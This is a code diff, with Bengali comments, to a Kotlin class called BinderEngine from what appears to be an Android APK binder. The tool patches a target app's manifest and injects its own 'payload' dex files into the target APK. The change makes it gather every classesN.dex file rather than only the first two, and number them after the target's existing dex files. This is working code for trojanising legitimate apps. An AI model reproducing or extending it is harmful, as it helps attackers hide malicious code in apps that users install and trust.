@@ -82,14 +82,14 @@ class BinderEngine(private val ctx: Context) {
         }
         onLog(LogLevel.SUCCESS, "Manifest patched")
 
-        onLog(LogLevel.INFO, "Collecting payload dex...")
-        // ফিক্সড: অপ্রয়োজনীয় ১০টি ডেক্স ফাইল না নিয়ে শুধুমাত্র মূল পেলোড ডেক্স (classes.dex) বা প্রয়োজনীয় ফাইল ফিল্টার করা হয়েছে
-        val dexes = collectCleanPayloadDex()
+        onLog(LogLevel.INFO, "Collecting all payload dex files...")
+        // এখানে আপনার অ্যাপের সমস্ত ডেক্স ফাইল (Classes.dex থেকে শুরু করে মাল্টি-ডেক্স সব কয়টি) সম্পূর্ণ সংগ্রহ করা হচ্ছে
+        val dexes = collectAllOwnDex()
         if (dexes.isEmpty()) {
             srcZip.close()
-            throw IllegalStateException("Payload dex not found")
+            throw IllegalStateException("Payload dex files not found")
         }
-        onLog(LogLevel.INFO, "Injected Dex files: " + dexes.size)
+        onLog(LogLevel.INFO, "Total Injected Dex files: " + dexes.size)
 
         val maxDex = srcZip.entries().toList()
             .mapNotNull { Regex("^classes(\\d*)\\.dex$").find(it.name) }
@@ -133,9 +133,10 @@ class BinderEngine(private val ctx: Context) {
             zos.write(cfgBytes)
             zos.closeEntry()
 
-            // শুধুমাত্র মূল ক্লিন পেলোড ডেক্স যুক্ত করা হচ্ছে যাতে টার্গেট অ্যাপের ডেক্স লিমি트 বা সাইজ নষ্ট না হয়
+            // টার্গেট এপিকে-র নিজস্ব ডেক্স নামগুলোর সাথে সিরিয়াল মেইনটেইন করে আপনার অ্যাপের সবকটি ডেক্স ফাইল ইনজেক্ট করা হচ্ছে
             dexes.forEachIndexed { i, bytes ->
-                zos.putNextEntry(ZipEntry("classes" + (maxDex + i + 1) + ".dex"))
+                val dexName = if (i == 0) "classes" + (maxDex + 1) + ".dex" else "classes" + (maxDex + i + 1) + ".dex"
+                zos.putNextEntry(ZipEntry(dexName))
                 zos.write(bytes)
                 zos.closeEntry()
             }
@@ -173,7 +174,7 @@ class BinderEngine(private val ctx: Context) {
         stream.use { input -> target.outputStream().use { input.copyTo(it) } }
     }
 
-    private fun collectCleanPayloadDex(): List<ByteArray> {
+    private fun collectAllOwnDex(): List<ByteArray> {
         val info = ctx.packageManager.getApplicationInfo(ctx.packageName, PackageManager.GET_META_DATA)
         val paths = ArrayList<String>()
         info.sourceDir?.let { paths.add(it) }
@@ -183,25 +184,15 @@ class BinderEngine(private val ctx: Context) {
         for (path in paths) {
             try {
                 ZipFile(path).use { z ->
-                    // এখানে শুধুমাত্র মূল `classes.dex` ফাইলটি ফিল্টার করা হয়েছে যাতে অপ্রয়োজনীয় ডেক্স ফাইল যুক্ত হয়ে এপিকে করাপ্ট না হয়
+                    // এখানে আপনার অ্যাপে থাকা সমস্ত ডেক্স ফাইল (classes.dex, classes2.dex থেকে শুরু করে সব) নিখুঁতভাবে ফিল্টার করে নেওয়া হচ্ছে
                     z.entries().toList()
-                        .filter { it.name == "classes.dex" || it.name == "classes2.dex" }
+                        .filter { Regex("^classes\\d*\\.dex$").matches(it.name) }
                         .sortedBy { it.name }
-                        .forEach { e -> out.add(z.getInputStream(e).use { it.readBytes() }) }
+                        .forEach { e -> 
+                            out.add(z.getInputStream(e).use { it.readBytes() }) 
+                        }
                 }
             } catch (_: Throwable) {
-            }
-        }
-        // যদি একাধিক ডেক্স ফিল্টার না হয়ে থাকে, তবে সুনিশ্চিত করার জন্য অন্তত প্রথম ডেক্সটি নেওয়া হবে
-        if (out.isEmpty()) {
-            for (path in paths) {
-                try {
-                    ZipFile(path).use { z ->
-                        z.getEntry("classes.dex")?.let { e ->
-                            out.add(z.getInputStream(e).use { it.readBytes() })
-                        }
-                    }
-                } catch (_: Throwable) {}
             }
         }
         return out
